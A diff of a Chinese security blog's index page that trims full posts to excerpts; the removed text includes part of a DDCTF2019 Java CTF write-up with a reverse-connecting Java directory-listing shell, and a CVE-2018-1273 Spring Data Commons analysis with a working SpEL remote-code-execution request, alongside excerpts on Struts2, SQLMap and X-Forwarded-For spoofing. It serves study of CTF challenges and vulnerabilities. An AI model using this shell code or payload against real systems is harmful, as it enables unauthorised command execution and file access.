bufferedWriter.flush();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>按照前面getshell的方式，同样一顿操作，成功连接上readFileShell，试了一下，没问题，但是这时候又出现了一个问题，flag在哪？…</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/24.png" alt="image"></p>
-<p>再次对R1.jar做一下修改，实现了java列目录的listDirShell…</p>
-<p>R2.jar</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.BufferedWriter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.OutputStreamWriter;</span><br><span class="line">import java.net.Socket;</span><br><span class="line">import java.nio.file.FileVisitResult;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.nio.file.SimpleFileVisitor;</span><br><span class="line">import java.nio.file.attribute.BasicFileAttributes;</span><br><span class="line"></span><br><span class="line">public class R &#123;</span><br><span class="line"></span><br><span class="line">    public R(String ip, Integer port) &#123;</span><br><span class="line">        new Thread(() -&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Socket socket = new Socket(ip,port);</span><br><span class="line">                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));</span><br><span class="line">                bufferedWriter.write(&quot;hello ddctf!&quot;);</span><br><span class="line">                bufferedWriter.newLine();</span><br><span class="line">                bufferedWriter.flush();</span><br><span class="line"></span><br><span class="line">                BufferedReader bufferedReader = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(socket.getInputStream()));</span><br><span class="line">                while (true) &#123;</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line = bufferedReader.readLine()) == null)</span><br><span class="line">                        ;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        v(line.trim(),bufferedWriter);</span><br><span class="line">                    &#125; catch (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        bufferedWriter.write(&quot;文件不存在&quot;);</span><br><span class="line">                        bufferedWriter.newLine();</span><br><span class="line">                    &#125;</span><br><span class="line">                    bufferedWriter.flush();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void v(String dddir,BufferedWriter bufferedWriter) throws IOException &#123;</span><br><span class="line">        Files.walkFileTree(Paths.get(dddir), new SimpleFileVisitor&lt;Path&gt;() &#123;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public FileVisitResult postVisitDirectory(Path dir, IOException exc) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    bufferedWriter.write(dir.toString());</span><br><span class="line">                    bufferedWriter.newLine();</span><br><span class="line">                    bufferedWriter.flush();</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                return FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    bufferedWriter.write(file.toString());</span><br><span class="line">                    bufferedWriter.newLine();</span><br><span class="line">                    bufferedWriter.flush();</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                return FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>按照前面getshell的方式，同样一顿操作，成功连接上listDirShell，试了一下，没问题，然后尝试了一下列/flag目录，good，终于找到flag文件了，这时候用R1.jar读取一下，成功get flag</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/25.png" alt="image"><br><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/26.png" alt="image"></p>
-
-          
+          <p>最近有好一段时间没有写blog了,并且很长时间没打CTF了，甚是怀念，然而又一次被DDCTF折磨了一周，嗯，还是JAVA题有意思，并且题目质量非常不错，故写一下解题过程以作纪念。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/04/25/DDCTF2019-WEB-再来一杯JAVA/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -596,47 +511,460 @@
 
       
         
-          
-            <h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Spring Data的作用，引用官方的描述：</p>
+          <h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Spring Data的作用，引用官方的描述：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Spring Data’s mission is to provide a familiar and consistent, Spring-based programming model for data access while still retaining the special traits of the underlying data store.</span><br><span class="line"></span><br><span class="line">It makes it easy to use data access technologies, relational and non-relational databases, map-reduce frameworks, and cloud-based data services. This is an umbrella project which contains many subprojects that are specific to a given database. The projects are developed by working together with many of the companies and developers that are behind these exciting technologies.</span><br></pre></td></tr></table></figure>
 <p>Google译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Data的使命是为数据访问提供熟悉且一致的基于Spring的编程模型，同时仍保留底层数据存储的特​​殊特性。</span><br><span class="line">它使数据访问技术，关系数据库和非关系数据库，map-reduce框架和基于云的数据服务变得简单易用。</span><br><span class="line">这是一个伞形项目，其中包含许多特定于给定数据库的子项目。</span><br><span class="line">这些项目是通过与这些激动人心的技术背后的许多公司和开发人员合作开发的。</span><br></pre></td></tr></table></figure></p>
-<h2 id="二、利用条件"><a href="#二、利用条件" class="headerlink" title="二、利用条件"></a>二、利用条件</h2><p>而此次主要分析的<strong>CVE-2018-1273</strong>主要涉及的包为Spring-Data-Commons，影响版本范围为<strong>1.13 ~ 1.13.10 或 2.0 ~ 2.0.5</strong>。  </p>
-<p>在复现此洞前，我们可以随意准备一个普通的Spring MVC web工程，并加入以下依赖：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.data&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-data-commons&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.13.10.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-<p>经过多次调试发现，主要影响入口在于Spring MVC的Dispatcher调度器处理过程中，参数解析使用了Spring-Data-Commons依赖包中的<strong>ProxyingHandlerMethodArgumentResolver</strong>解析导致。</p>
-<p>在跟进<strong>ProxyingHandlerMethodArgumentResolver</strong>具体实现前，先解释一下Controller接口方法执行前的参数解析为何会选择了它（<strong>ProxyingHandlerMethodArgumentResolver</strong>）进行参数解析。</p>
-<p>原来，在Java中，接口interface是一种规则的定义类class，它并不能被实例化，所以在Controller接口方法中，一旦使用了如下所示的接口去接收请求参数时，并且引入了Spring-Data-Commons的依赖，则在参数解析时，会选择<strong>ProxyingHandlerMethodArgumentResolver</strong>对参数接收的接口类做一个代理实现，并把参数值解析保存下来。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/test"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">postTest</span><span class="params">(Payload payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> payload.getAAA() + <span class="string">":"</span> + payload.getBBB();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Payload</span> </span>&#123;</span><br><span class="line">        <span class="function">String <span class="title">getAAA</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function">String <span class="title">getBBB</span><span class="params">()</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到，test接口参数接收使用了一个interface。</p>
-<p>现在，我们使用如下payload进行debug：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /test HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">AAA[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)]=111&amp;BBB=222</span><br></pre></td></tr></table></figure>
-<p>启动web项目后，发送payload，我们可以看到，计算器如约而至QAQ</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE1.png" alt="image"></p>
-<p>好了，到这里，我们已经知道了Spring-Data-Commons CVE-2018-1273 RCE触发的条件以及相应的payload了，下面我们对源码进行具体跟进。</p>
-<h2 id="三、源码跟踪"><a href="#三、源码跟踪" class="headerlink" title="三、源码跟踪"></a>三、源码跟踪</h2><p>这里我们不再从没多大必要讲解的Spring Dispatcher开始，直接奔到参数解析。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE2.png" alt="image"></p>
-<p>可以看到，该接口的interface类参数解析，使用的是<strong>ProxyingHandlerMethodArgumentResolver</strong>，为了进一步跟踪具体发生了什么，我们跟进该类的resolveArgument方法。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BEspring-data-commons-cve-2018-1273%E5%9B%BE3.png" alt="image"></p>
-<p>根据漏洞触发的代码执行流程，可以发现触发点在createAttribute方法内，根据上下文以及参数、方法名等，我们可以姑且猜测该方法是对http传入的数据，创建了相应的参数类实例进行对参数的存储使用，我们再跟进该方法。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE4.png" alt="image"></p>
-<p>看该方法的代码，我们可以发现此处创建了一个MapDataBinder类的对象，并把参数值设置进去，看到这里，就可以解释了为啥前面利用条件所描述的interface Payload 类能接收参数了，原来在这个<strong>ProxyingHandlerMethodArgumentResolver</strong>（中文应该译为方法参数解析代理处理，额，英文不好，将就着吧）中创建了一个正在的实例MapDataBinder对参数进行存储。</p>
-<p>下面继续跟进参数设置的逻辑，即bind方法。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE5.png" alt="image"></p>
-<p>可以看到此处接着调用了dobind方法，继续跟进。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE6.png" alt="image"></p>
-<p>还是调用了重载方法dobind方法，继续跟进去看看吧。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE7.png" alt="image"></p>
-<p>此处发现，还是没有什么重要的逻辑，继续跟进方法applyPropertyValues。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE8.png" alt="image"></p>
-<p>此处，关键在于PropertyAccessor的setPropertyValues方法了，继续进一步跟进。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE9.png" alt="image"></p>
-<p>此处也跟前面一样调用了重载方法，我们继续跟进去看看什么情况。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE10.png" alt="image"></p>
-<p>emmm，还是重载方法，继续。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/Spring-data-commons/spring-data-commons-cve-2018-1273%E5%9B%BE11.png" alt="image"></p>
-<p>咦，好像有些不一样的东西了，原来payload的触发在于此处，对参数名称进行了spel的执行，好累啊emmm。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/03/24/Spring-Data-Commons CVE-2018-1273 RCE漏洞分析/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/12/Struts2 RCE漏洞分析系列 - 0x01基础篇/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="threedr3am">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="大彩笔threedr3am">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/12/Struts2 RCE漏洞分析系列 - 0x01基础篇/" itemprop="url">Struts2 RCE漏洞分析系列 - 0x01基础篇</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-12T19:15:33+08:00">
+                2018-12-12
+              </time>
+            
+
+            
+
+            
+          </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>众所周知，Java Web中使用最广泛的两个mvc框架，一是Spring MVC，一是Struts2。<br>但Struts由于安全性、性能、内存消耗等短板，已经越来越少新项目使用它了，更多的开发人员钟爱于Spring MVC。</p>
+<p>说起Struts2的安全问题，到目前为止，已经被爆出两位数以上的RCE（远程命令执行）漏洞了。而很多国企、政府、小企业部署的web系统，一般出于缺乏技术研发人员，很多项目都是外包到外包企业，因此大量的旧项目采用了Struts2框架，并由于缺少资金投入，年久失修，经常性一个漏洞被爆出后，三五个月都没有去修复，使得黑客乘虚而入，盗取大量用户信息。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/12/Struts2 RCE漏洞分析系列 - 0x01基础篇/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/02/2018湖湘杯线上赛某WEB题之SQLMap实践/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="threedr3am">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="大彩笔threedr3am">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/02/2018湖湘杯线上赛某WEB题之SQLMap实践/" itemprop="url">2018湖湘杯线上赛某WEB题之SQLMap实践</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-02T18:25:33+08:00">
+                2018-12-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>这次线上赛中，web题目难度偏低，但体验极差，不知出题人是如何思考的，居然题目直接部署，docker都不起，最尴尬的还是，跑web服务的居然是root用户，23333</p>
+<p>赛后听说某大佬已经打到内网，官方wp都拿到了。。。xswl</p>
+<p>这次比赛中，某道WEB题存在着SQL注入，并且SQLMap一把梭，对于我等新手来讲，体验极爽，充分提高了日题积极性。但因为以前没怎么用过SQLMap，对SQLMap的理解为零，所以在用SQLMap解题时，还是极为艰难地查了一翻资料。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/02/2018湖湘杯线上赛某WEB题之SQLMap实践/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/DDCTF2018某Web题之布尔盲注实践/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="threedr3am">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="大彩笔threedr3am">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/17/DDCTF2018某Web题之布尔盲注实践/" itemprop="url">DDCTF2018某Web题之布尔盲注实践</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-17T19:57:27+08:00">
+                2018-04-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h3 id="0x01-web1-数据库的秘密"><a href="#0x01-web1-数据库的秘密" class="headerlink" title="0x01 web1 数据库的秘密"></a>0x01 web1 数据库的秘密</h3><p>访问题目给出的页面，tis -&gt; 非法链接，只允许来自 <strong>123.232.23.245</strong> 的访问</p>
+<p>修改请求头，伪造请求源ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:123.232.23.245</span><br></pre></td></tr></table></figure>
+<p>再次请求页面，可以看到已经通过，成功加载页面</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/17/DDCTF2018某Web题之布尔盲注实践/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -674,7 +1002,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
